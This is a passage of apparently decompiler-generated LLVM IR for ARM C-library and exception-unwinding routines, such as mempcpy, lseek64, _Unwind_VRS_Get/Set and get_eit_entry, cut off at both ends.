  uselistorder label %dec_label_pc_17978, { 1, 0 }
  uselistorder label %dec_label_pc_17928, { 1, 0 }
  uselistorder label %dec_label_pc_1791c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17998 = load i32, i32* @r4, align 4
  %v6_17998 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_179a8 = call i32 @memcpy()
  %v0_179ac = load i32, i32* @r5, align 4
  %v1_179ac = load i32, i32* @r4, align 4
  %v2_179ac = add i32 %v1_179ac, %v0_179ac
  store i32 %v3_17998, i32* @r4, align 4
  store i32 %v6_17998, i32* @r5, align 4
  ret i32 %v2_179ac
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_179bc = load i32, i32* @r1, align 4
  %v2_179bc = icmp eq i32 %v0_179bc, 0
  %v3_179c0 = load i32, i32* @r4, align 4
  store i32 %v3_179c0, i32* %stack_var_-8, align 4
  %v0_179c4 = load i32, i32* @r0, align 4
  store i32 %v0_179c4, i32* %r4.global-to-local, align 4
  br i1 %v2_179bc, label %dec_label_pc_179e8, label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %entry
  %v1_179d4 = add i32 %v0_179c4, 260
  %v4_179d8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_179d4)
  %v2_179dc = icmp eq i32 %v4_179d8, 0
  br i1 %v2_179dc, label %dec_label_pc_179ec, label %dec_label_pc_179e8

dec_label_pc_179e8:                               ; preds = %dec_label_pc_179cc, %entry
  br label %dec_label_pc_179ec

dec_label_pc_179ec:                               ; preds = %dec_label_pc_179cc, %dec_label_pc_179e8
  %storemerge = phi i32 [ 0, %dec_label_pc_179e8 ], [ 1, %dec_label_pc_179cc ]
  %v1_179f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_179f0 = add i32 %v1_179f0, 256
  %v3_179f0 = inttoptr i32 %v2_179f0 to i32*
  store i32 %storemerge, i32* %v3_179f0, align 4
  %v2_179f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_179f4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 3, 21, 4, 22, 23, 24 }
  uselistorder i32 260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_179ec, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_17a44, label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %entry
  %v0_17a2c = call i32 @__aeabi_read_tp()
  %v3_17a30 = load i16, i16* @global_var_216ec.303, align 2
  %v4_17a30 = sext i16 %v3_17a30 to i32
  %v0_17a34 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a34 = sub i32 0, %v0_17a34
  store i32 %v1_17a34, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17a3c = add i32 %v4_17a30, %v0_17a2c
  %v4_17a3c = inttoptr i32 %v3_17a3c to i32*
  store i32 %v1_17a34, i32* %v4_17a3c, align 4
  %v0_17a4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a44:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_17a44 = icmp eq i32 %arg1, 0
  br i1 %v2_17a44, label %dec_label_pc_17a58, label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %dec_label_pc_17a44, %dec_label_pc_17a28
  %v0_17a4c = phi i32 [ %arg1, %dec_label_pc_17a44 ], [ %v0_17a4c.pre, %dec_label_pc_17a28 ]
  %v3_17a50 = ashr i32 %v0_17a4c, 31
  br label %dec_label_pc_17a5c

dec_label_pc_17a58:                               ; preds = %dec_label_pc_17a44
  br label %dec_label_pc_17a5c

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a4c, %dec_label_pc_17a58
  %v1_17a64 = phi i32 [ %v0_17a4c, %dec_label_pc_17a4c ], [ %tmp8, %dec_label_pc_17a58 ]
  %storemerge = phi i32 [ %v3_17a50, %dec_label_pc_17a4c ], [ %tmp, %dec_label_pc_17a58 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_17a64

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 3, 1, 2, 4, 5, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_216ec.303, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 65, 70, 31, 64, 63, 79, 78, 68, 69, 67, 66, 77, 76, 75, 74, 73, 72, 71, 17, 25, 27, 35, 62, 44, 43, 12, 6, 5, 11, 24, 23, 10, 3, 2, 13, 9, 8, 7, 49, 16, 22, 48, 47, 26, 19, 21, 20, 59, 58, 14, 33, 32, 30, 34, 57, 46, 56, 55, 29, 28, 18, 61, 60, 42, 39, 38, 37, 45, 4, 54, 53, 36, 52, 15, 51, 50, 0, 1, 41, 40 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_17a5c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17a6c = icmp eq i32 %regclass, 0
  br i1 %v2_17a6c, label %dec_label_pc_17a74, label %dec_label_pc_17aa4

dec_label_pc_17a74:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17a74
  %v6_17a78 = icmp eq i32 %representation, 0
  br i1 %v6_17a78, label %dec_label_pc_17a88, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17a74
  br label %dec_label_pc_17ab0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17ab0

dec_label_pc_17a88:                               ; preds = %bb
  %v3_17a88 = mul i32 %regno, 4
  %v2_17a8c = add i32 %v3_17a88, %context
  %v1_17a90 = add i32 %v2_17a8c, 4
  %v2_17a90 = inttoptr i32 %v1_17a90 to i32*
  %v3_17a90 = load i32, i32* %v2_17a90, align 4
  %v2_17a9c = bitcast i8* %valuep to i32*
  store i32 %v3_17a90, i32* %v2_17a9c, align 4
  ret i32 0

dec_label_pc_17aa4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17aa4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17aa4, %bb9
  %v0_17aac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17aac)
  br label %dec_label_pc_17ab0

dec_label_pc_17ab0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17ab0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17ab8 = icmp eq i32 %regclass, 0
  br i1 %v2_17ab8, label %dec_label_pc_17ac0, label %dec_label_pc_17af0

dec_label_pc_17ac0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17ac0
  %v6_17ac4 = icmp eq i32 %representation, 0
  br i1 %v6_17ac4, label %dec_label_pc_17ad4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17ac0
  br label %dec_label_pc_17afc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17afc

dec_label_pc_17ad4:                               ; preds = %bb
  %v3_17ad8 = mul i32 %regno, 4
  %v1_17adc = bitcast i8* %valuep to i32*
  %v2_17adc = load i32, i32* %v1_17adc, align 4
  %v2_17ae0 = add i32 %v3_17ad8, %context
  %v2_17ae8 = add i32 %v2_17ae0, 4
  %v3_17ae8 = inttoptr i32 %v2_17ae8 to i32*
  store i32 %v2_17adc, i32* %v3_17ae8, align 4
  ret i32 0

dec_label_pc_17af0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17af0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17af0, %bb9
  %v0_17af8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17af8)
  br label %dec_label_pc_17afc

dec_label_pc_17afc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17afc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_17b04 = add i32 %context, 68
  %v2_17b04 = inttoptr i32 %v1_17b04 to i32*
  %v3_17b04 = load i32, i32* %v2_17b04, align 4
  ret i32 %v3_17b04

; uselistorder directives
  uselistorder i32 68, { 11, 0, 9, 1, 10, 2, 4, 5, 6, 7, 3, 8 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_17b14 = add i32 %exc, 8
  %v2_17b14 = inttoptr i32 %v1_17b14 to i32*
  %v3_17b14 = load i32, i32* %v2_17b14, align 4
  %v2_17b18 = icmp eq i32 %v3_17b14, 0
  br i1 %v2_17b18, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_17b2c = xor i1 %v2_17b18, true
  call void @__pseudo_cond_branch(i1 %v2_17b2c, i32 %v3_17b14)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17b44 = call i32 @abort()
  ret i32 %v0_17b44
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_17b50 = call i32 @abort()
  ret i32 %v0_17b50
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_17b54 = load i32, i32* @r4, align 4
  store i32 %v3_17b54, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r5.global-to-local, align 4
  %v4_17b64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 132) to i32*), align 4
  %v2_17b68 = icmp eq i32 %v4_17b64, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_17b74 = add i32 %return_address, -2
  store i32 %v1_17b74, i32* %r4.global-to-local, align 4
  br i1 %v2_17b68, label %dec_label_pc_17bac, label %dec_label_pc_17b7c

dec_label_pc_17b7c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_17b64)
  %v2_17b8c = icmp eq i32 %v1_17b74, 0
  br i1 %v2_17b8c, label %.thread, label %dec_label_pc_17bccthread-pre-split

.thread:                                          ; preds = %dec_label_pc_17b7c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_17b94 = load i32, i32* %r6.global-to-local, align 4
  %v3_17b94 = add i32 %v2_17b94, 16
  %v4_17b94 = inttoptr i32 %v3_17b94 to i32*
  store i32 0, i32* %v4_17b94, align 4
  br label %dec_label_pc_17b9c

dec_label_pc_17b9c:                               ; preds = %.thread, %.thread10, %dec_label_pc_17d44, %dec_label_pc_17d30, %dec_label_pc_17d0c, %dec_label_pc_17ce4, %dec_label_pc_17be4
  %v0_17b9c = load i32, i32* %r2.global-to-local, align 4
  %v2_17ba4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17ba4, i32* @r4, align 4
  ret i32 %v0_17b9c

dec_label_pc_17bac:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_17bb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 20) to i32*), align 4
  %v4_17bb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 48) to i32*), align 4
  store i32 %v4_17bb8, i32* %r2.global-to-local, align 4
  %v2_17bbc = sub i32 %v4_17bb4, %v4_17bb8
  %v3_17bc0 = sdiv i32 %v2_17bbc, 8
  store i32 %v3_17bc0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17bcc

dec_label_pc_17bccthread-pre-split:               ; preds = %dec_label_pc_17b7c
  %v3_17bcc.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17bcc

dec_label_pc_17bcc:                               ; preds = %dec_label_pc_17bccthread-pre-split, %dec_label_pc_17bac
  %v0_17c10.pre = phi i32 [ %v1_17b74, %dec_label_pc_17bccthread-pre-split ], [ %v4_17bb8, %dec_label_pc_17bac ]
  %v1_17bd4 = phi i32 [ %v3_17bcc.pr, %dec_label_pc_17bccthread-pre-split ], [ %v3_17bc0, %dec_label_pc_17bac ]
  %v2_17bd0 = icmp eq i32 %v1_17bd4, 0
  br i1 %v2_17bd0, label %dec_label_pc_17be4, label %dec_label_pc_17c00.preheader

dec_label_pc_17c00.preheader:                     ; preds = %dec_label_pc_17bcc
  %v2_17bd4 = add i32 %v1_17bd4, -1
  %v1_17c30 = add i32 %v0_17c10.pre, 8
  br label %dec_label_pc_17c00.outer

dec_label_pc_17be4.loopexit:                      ; preds = %dec_label_pc_17c5c
  br label %dec_label_pc_17be4

dec_label_pc_17be4:                               ; preds = %dec_label_pc_17be4.loopexit, %dec_label_pc_17bcc, %dec_label_pc_17d28
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_17bec = load i32, i32* %r6.global-to-local, align 4
  %v2_17bec = add i32 %v1_17bec, 16
  %v3_17bec = inttoptr i32 %v2_17bec to i32*
  store i32 0, i32* %v3_17bec, align 4
  br label %dec_label_pc_17b9c

dec_label_pc_17bf4:                               ; preds = %dec_label_pc_17c50
  %v3_17bf4 = icmp ult i32 %storemerge40, %v0_17c54
  br i1 %v3_17bf4, label %dec_label_pc_17bfc, label %dec_label_pc_17c6c

dec_label_pc_17bfc:                               ; preds = %dec_label_pc_17bf4
  %v1_17bfc = add nsw i32 %v3_17c08, 1
  br label %dec_label_pc_17c00.outer

dec_label_pc_17c00.outer:                         ; preds = %dec_label_pc_17bfc, %dec_label_pc_17c00.preheader
  %v1_17c5c.ph = phi i32 [ %v1_17bfc, %dec_label_pc_17bfc ], [ 0, %dec_label_pc_17c00.preheader ]
  %v0_17c00.ph = phi i32 [ %v0_17c00, %dec_label_pc_17bfc ], [ %v2_17bd4, %dec_label_pc_17c00.preheader ]
  br label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17c00.outer, %dec_label_pc_17c64
  %v0_17c00 = phi i32 [ %v1_17c64, %dec_label_pc_17c64 ], [ %v0_17c00.ph, %dec_label_pc_17c00.outer ]
  %v2_17c00 = add i32 %v0_17c00, %v1_17c5c.ph
  %tmp = icmp slt i32 %v2_17c00, 0
  %v4_17c04 = zext i1 %tmp to i32
  %v5_17c04 = add i32 %v4_17c04, %v2_17c00
  %v3_17c08 = sdiv i32 %v5_17c04, 2
  %v3_17c0c = mul i32 %v3_17c08, 8
  store i32 %v3_17c0c, i32* @ip, align 4
  %v2_17c10 = add i32 %v3_17c0c, %v0_17c10.pre
  %v3_17c10 = inttoptr i32 %v2_17c10 to i32*
  %v4_17c10 = load i32, i32* %v3_17c10, align 4
  %v1_17c14 = and i32 %v4_17c10, 1073741824
  %v2_17c14 = icmp eq i32 %v1_17c14, 0
  %v2_17c18 = or i32 %v4_17c10, -2147483648
  %tmp79 = bitcast i32 %v4_17c10 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_17c1c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_17c14, i32 %v2_17c1c, i32 %v2_17c18
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_17c20 = icmp eq i32 %v2_17bd4, %v3_17c08
  store i32 %v2_17c10, i32* %r7.global-to-local, align 4
  br i1 %v9_17c20, label %dec_label_pc_17c50, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c00
  %v2_17c34 = add i32 %v3_17c0c, %v1_17c30
  %v3_17c34 = inttoptr i32 %v2_17c34 to i32*
  %v4_17c34 = load i32, i32* %v3_17c34, align 4
  %v1_17c3c = and i32 %v4_17c34, 1073741824
  %v2_17c3c = icmp eq i32 %v1_17c3c, 0
  %v2_17c40 = or i32 %v4_17c34, -2147483648
  %tmp81 = bitcast i32 %v4_17c34 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_17c44 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_17c3c, i32 %v2_17c44, i32 %v2_17c40
  %v1_17c48 = add i32 %v2_17c34, -1
  %v2_17c4c = add i32 %storemerge39, %v1_17c48
  br label %dec_label_pc_17c50

dec_label_pc_17c50:                               ; preds = %dec_label_pc_17c00, %dec_label_pc_17c30
  %storemerge40 = phi i32 [ %v2_17c4c, %dec_label_pc_17c30 ], [ -1, %dec_label_pc_17c00 ]
  %v2_17c50 = add i32 %storemerge, %v2_17c10
  %v0_17c54 = load i32, i32* %r4.global-to-local, align 4
  %v3_17c54 = icmp ult i32 %v0_17c54, %v2_17c50
  br i1 %v3_17c54, label %dec_label_pc_17c5c, label %dec_label_pc_17bf4

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c50
  %v9_17c5c = icmp eq i32 %v3_17c08, %v1_17c5c.ph
  br i1 %v9_17c5c, label %dec_label_pc_17be4.loopexit, label %dec_label_pc_17c64

dec_label_pc_17c64:                               ; preds = %dec_label_pc_17c5c
  %v1_17c64 = add nsw i32 %v3_17c08, -1
  br label %dec_label_pc_17c00

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17bf4
  %v2_17c6c = load i32, i32* %v3_17c10, align 4
  %v1_17c70 = and i32 %v2_17c6c, 1073741824
  %v2_17c70 = icmp eq i32 %v1_17c70, 0
  %v2_17c74 = or i32 %v2_17c6c, -2147483648
  %tmp83 = bitcast i32 %v2_17c6c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_17c78 = bitcast float %tmp84 to i32
  %v0_17c7c = select i1 %v2_17c70, i32 %v2_17c78, i32 %v2_17c74
  %v2_17c7c = add i32 %v0_17c7c, %v2_17c10
  %v1_17c80 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c80 = add i32 %v1_17c80, 72
  %v3_17c80 = inttoptr i32 %v2_17c80 to i32*
  store i32 %v2_17c7c, i32* %v3_17c80, align 4
  %v0_17c84 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c84 = add i32 %v0_17c84, 4
  %v2_17c84 = inttoptr i32 %v1_17c84 to i32*
  %v3_17c84 = load i32, i32* %v2_17c84, align 4
  %v7_17c88 = icmp eq i32 %v3_17c84, 1
  br i1 %v7_17c88, label %.thread10, label %dec_label_pc_17c9c

.thread10:                                        ; preds = %dec_label_pc_17c6c
  %v1_17c88 = add i32 %v3_17c84, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_17c94 = load i32, i32* %r6.global-to-local, align 4
  %v3_17c94 = add i32 %v2_17c94, 16
  %v4_17c94 = inttoptr i32 %v3_17c94 to i32*
  store i32 %v1_17c88, i32* %v4_17c94, align 4
  br label %dec_label_pc_17b9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c6c
  %v1_17c9c = icmp slt i32 %v3_17c84, 0
  br i1 %v1_17c9c, label %.thread38, label %dec_label_pc_17cb4

.thread38:                                        ; preds = %dec_label_pc_17c9c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_17ca8 = load i32, i32* %r6.global-to-local, align 4
  %v5_17ca8 = add i32 %v4_17ca8, 76
  %v6_17ca8 = inttoptr i32 %v5_17ca8 to i32*
  store i32 %v1_17c84, i32* %v6_17ca8, align 4
  %v3_17cac = load i32, i32* %r2.global-to-local, align 4
  %v4_17cac = load i32, i32* %r6.global-to-local, align 4
  %v5_17cac = add i32 %v4_17cac, 80
  %v6_17cac = inttoptr i32 %v5_17cac to i32*
  store i32 %v3_17cac, i32* %v6_17cac, align 4
  br label %dec_label_pc_17cd4

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17c9c
  %v1_17cb4 = and i32 %v3_17c84, 1073741824
  %v2_17cb4 = icmp eq i32 %v1_17cb4, 0
  %v2_17cb8 = or i32 %v3_17c84, -2147483648
  %tmp85 = bitcast i32 %v3_17c84 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_17cbc = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_17cb4, i32 %v2_17cbc, i32 %v2_17cb8
  %v1_17cc0 = add i32 %storemerge42, 4
  %v2_17cc4 = add i32 %v1_17cc0, %v0_17c84
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17ccc = load i32, i32* %r6.global-to-local, align 4
  %v2_17ccc = add i32 %v1_17ccc, 76
  %v3_17ccc = inttoptr i32 %v2_17ccc to i32*
  store i32 %v2_17cc4, i32* %v3_17ccc, align 4
  %v0_17cd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17cd0 = load i32, i32* %r6.global-to-local, align 4
  %v2_17cd0 = add i32 %v1_17cd0, 80
  %v3_17cd0 = inttoptr i32 %v2_17cd0 to i32*
  store i32 %v0_17cd0, i32* %v3_17cd0, align 4
  br label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %.thread38, %dec_label_pc_17cb4
  %v0_17cd4 = load i32, i32* %r6.global-to-local, align 4
  %v1_17cd4 = add i32 %v0_17cd4, 76
  %v2_17cd4 = inttoptr i32 %v1_17cd4 to i32*
  %v3_17cd4 = load i32, i32* %v2_17cd4, align 4
  store i32 %v3_17cd4, i32* %r2.global-to-local, align 4
  %v1_17cd8 = inttoptr i32 %v3_17cd4 to i32*
  %v2_17cd8 = load i32, i32* %v1_17cd8, align 4
  %v1_17cdc = icmp slt i32 %v2_17cd8, 0
  br i1 %v1_17cdc, label %dec_label_pc_17d00, label %dec_label_pc_17ce4

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17cd4
  %v1_17ce4 = and i32 %v2_17cd8, 1073741824
  %v2_17ce4 = icmp eq i32 %v1_17ce4, 0
  %v2_17ce8 = or i32 %v2_17cd8, -2147483648
  %tmp87 = bitcast i32 %v2_17cd8 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_17cec = bitcast float %tmp88 to i32
  %v0_17cf0 = select i1 %v2_17ce4, i32 %v2_17cec, i32 %v2_17ce8
  %v2_17cf0 = add i32 %v0_17cf0, %v3_17cd4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17cf8 = add i32 %v0_17cd4, 16
  %v3_17cf8 = inttoptr i32 %v2_17cf8 to i32*
  store i32 %v2_17cf0, i32* %v3_17cf8, align 4
  br label %dec_label_pc_17b9c

dec_label_pc_17d00:                               ; preds = %dec_label_pc_17cd4
  %v3_17d00 = udiv i32 %v2_17cd8, 16777216
  %v1_17d04 = urem i32 %v3_17d00, 16
  %v2_17d04 = icmp eq i32 %v1_17d04, 0
  br i1 %v2_17d04, label %dec_label_pc_17d0c, label %dec_label_pc_17d20

dec_label_pc_17d0c:                               ; preds = %dec_label_pc_17d00
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17d14 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d14 = add i32 %v0_17d14, -36724
  %v2_17d18 = add i32 %v0_17cd4, 16
  %v3_17d18 = inttoptr i32 %v2_17d18 to i32*
  store i32 %v2_17d14, i32* %v3_17d18, align 4
  br label %dec_label_pc_17b9c

dec_label_pc_17d20:                               ; preds = %dec_label_pc_17d00
  %v7_17d20 = icmp eq i32 %v1_17d04, 1
  br i1 %v7_17d20, label %dec_label_pc_17d44, label %dec_label_pc_17d28

dec_label_pc_17d28:                               ; preds = %dec_label_pc_17d20
  %v7_17d28 = icmp eq i32 %v1_17d04, 2
  br i1 %v7_17d28, label %dec_label_pc_17d30, label %dec_label_pc_17be4

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17d28
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17d38 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d38 = add i32 %v0_17d38, -36740
  %v2_17d3c = add i32 %v0_17cd4, 16
  %v3_17d3c = inttoptr i32 %v2_17d3c to i32*
  store i32 %v2_17d38, i32* %v3_17d3c, align 4
  br label %dec_label_pc_17b9c

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17d20
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17d4c = load i32, i32* %r5.global-to-local, align 4
  %v2_17d4c = add i32 %v0_17d4c, -36732
  %v2_17d50 = add i32 %v0_17cd4, 16
  %v3_17d50 = inttoptr i32 %v2_17d50 to i32*
  store i32 %v2_17d4c, i32* %v3_17d50, align 4
  br label %dec_label_pc_17b9c

; uselistorder directives
  uselistorder i32 %v1_17d04, { 2, 1, 0 }
  uselistorder i32 %v0_17cd4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_17c84, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17c54, { 1, 0 }
  uselistorder i32 %v3_17c0c, { 2, 1, 0 }
  uselistorder i32 %v3_17c08, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_17c00, { 1, 0 }
  uselistorder i32 %v0_17c00, { 1, 0 }
  uselistorder i32 %v2_17bd4, { 1, 0 }
  uselistorder i32 %v0_17c10.pre, { 1, 0 }
  uselistorder i32 %v3_17bc0, { 1, 0 }
  uselistorder i32 %v1_17b74, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17cd4, { 1, 0 }
  uselistorder label %dec_label_pc_17c50, { 1, 0 }
  uselistorder label %dec_label_pc_17c00, { 1, 0 }
  uselistorder label %dec_label_pc_17be4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17b9c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_17d5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d5c:
  %v0_17d5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d5c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17d5c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17d5c, %bb
  %v10_17d64 = phi i32 [ %arg1, %dec_label_pc_17d5c ], [ 0, %bb ]
  ret i32 %v10_17d64

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_17d78 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_17d8c = inttoptr i32 %v1_17d78 to i32*
  %v2_17d8c = load i32, i32* %v1_17d8c, align 4
  store i32 %v2_17d8c, i32* %r0.global-to-local, align 4
  %v12_17d8c = add i32 %entry_vrs, 20
  %v1_17d98 = inttoptr i32 %v12_17d8c to i32*
  %v2_17d98 = load i32, i32* %v1_17d98, align 4
  store i32 %v2_17d98, i32* %r0.global-to-local, align 4
  %v12_17d98 = add i32 %entry_vrs, 36
